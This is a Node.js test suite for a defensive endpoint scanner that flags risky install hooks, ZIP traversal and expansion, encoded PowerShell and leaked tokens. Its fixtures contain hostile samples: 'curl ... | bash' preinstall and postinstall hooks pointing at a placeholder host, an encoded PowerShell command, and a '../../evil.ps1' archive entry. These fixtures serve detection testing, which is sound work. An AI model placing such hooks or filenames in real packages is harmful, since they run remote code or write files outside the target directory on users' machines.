import assert from 'node:assert/strict';
import test from 'node:test';
import fs from 'node:fs';
import os from 'node:os';
import path from 'node:path';
import { inspectLifecycleScripts, inspectZipDirectory, scanEndpoint, endpointSarif } from '../src/endpoint-shield.mjs';

function mockZipEntry(name, expanded = 100, compressed = 50) {
  const filename = Buffer.from(name);
  const size = 46 + filename.length;
  const bytes = Buffer.alloc(size + 22);
  bytes.writeUInt32LE(0x02014b50, 0);
  bytes.writeUInt32LE(compressed, 20);
  bytes.writeUInt32LE(expanded, 24);
  bytes.writeUInt16LE(filename.length, 28);
  filename.copy(bytes, 46);
  bytes.writeUInt32LE(0x06054b50, size);
  bytes.writeUInt16LE(1, size + 8);
  bytes.writeUInt16LE(1, size + 10);
  bytes.writeUInt32LE(size, size + 12);
  bytes.writeUInt32LE(0, size + 16);
  return bytes;
}

test('flags lifecycle download-and-execute but not a normal build hook', () => {
  const bad = JSON.stringify({ scripts: { preinstall: 'curl https://example.invalid/setup.sh | bash' } });
  const result = inspectLifecycleScripts(bad, 'package.json');
  assert.equal(result[0].rule, 'lifecycle-download-and-execute');
  assert.equal(result[0].severity, 'critical');
  assert.equal(JSON.stringify(result).includes('https://example.invalid'), false);
  assert.deepEqual(inspectLifecycleScripts(JSON.stringify({ scripts: { preinstall: 'node scripts/setup.js' } }), 'package.json'), []);
});

test('ZIP directory metadata catches traversal and expansion without extracting entries', () => {
  const traversal = inspectZipDirectory(mockZipEntry('../../evil.ps1'), 'download.zip');
  assert.equal(traversal.entries, 1);
  assert.ok(traversal.findings.some(f => f.rule === 'archive-path-traversal'));
  const bomb = inspectZipDirectory(mockZipEntry('content.bin', 100 * 1024 * 1024, 50), 'download.zip');
  assert.ok(bomb.findings.some(f => f.rule === 'archive-expansion-risk'));
  assert.throws(() => inspectZipDirectory(Buffer.from('not-a-zip'), 'file.zip'), /shorter/);
});

test('local filesystem scan reuses deterministic preflight and secrets rules without reporting secret values', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'devshield-endpoint-'));
  try {
    fs.writeFileSync(path.join(dir, 'payload.ps1'), 'powershell.exe -EncodedCommand QUJD\n');
    fs.writeFileSync(path.join(dir, 'package.json'), JSON.stringify({ scripts: { postinstall: 'curl https://example.invalid/setup | sh' } }));
    const secret = 'ghp_' + 'X'.repeat(31);
    fs.writeFileSync(path.join(dir, '.env'), 'GITHUB_TOKEN=' + secret);
    fs.writeFileSync(path.join(dir, 'download.zip'), mockZipEntry('../../evil.ps1'));
    let report = scanEndpoint(dir);
    assert.equal(report.summary.status, 'suspicious');
    assert.equal(report.mode, 'offline-read-only');
    assert.ok(report.findings.some(f => f.rule === 'powershell-encoded-command'));
    assert.ok(report.findings.some(f => f.rule === 'lifecycle-download-and-execute'));
    assert.ok(report.findings.some(f => f.rule === 'github-token'));
    assert.ok(report.findings.some(f => f.rule === 'archive-path-traversal'));
    assert.equal(report.complete, true);
    assert.equal(JSON.stringify(report).includes(secret), false);
    assert.equal(endpointSarif(report).version, '2.1.0');
    fs.writeFileSync(path.join(dir, 'binary.exe'), Buffer.from([0x4d, 0x5a, 0, 0]));
    report = scanEndpoint(dir);
    assert.equal(report.complete, false);
    assert.equal(report.unsupportedExecutables, 1);
    assert.equal(report.summary.status, 'incomplete');
    assert.equal(report.summary.zeroFindingsProveSafe, false);
  } finally { fs.rmSync(dir, { recursive: true, force: true }); }
});

test('refuses symlinks, unreadable/oversized targets and unreasonable limits', () => {
  const dir = fs.mkdtempSync(path.join(os.tmpdir(), 'devshield-endpoint-'));
  const out = fs.mkdtempSync(path.join(os.tmpdir(), 'devshield-outside-'));
  try {
    fs.writeFileSync(path.join(out, 'outside.js'), 'const dangerous = true;');
    fs.symlinkSync(path.join(out, 'outside.js'), path.join(dir, 'outside.js'));
    let report = scanEndpoint(dir);
    assert.equal(report.complete, false);
    assert.ok(report.errors.some(x => x.reason === 'symlink-not-followed'));
    assert.throws(() => scanEndpoint(path.join(dir, 'outside.js')), /ordinary directory or file/);
    fs.writeFileSync(path.join(dir, 'huge.js'), 'x'.repeat(1024));
    report = scanEndpoint(dir, { maxFileBytes: 32 });
    assert.ok(report.errors.some(x => x.reason === 'file-exceeds-size-limit'));
    assert.throws(() => scanEndpoint(dir, { maxFiles: 999999 }), /Invalid scan limit/);
  } finally {
    fs.rmSync(dir, { recursive: true, force: true });
    fs.rmSync(out, { recursive: true, force: true });
  }
});
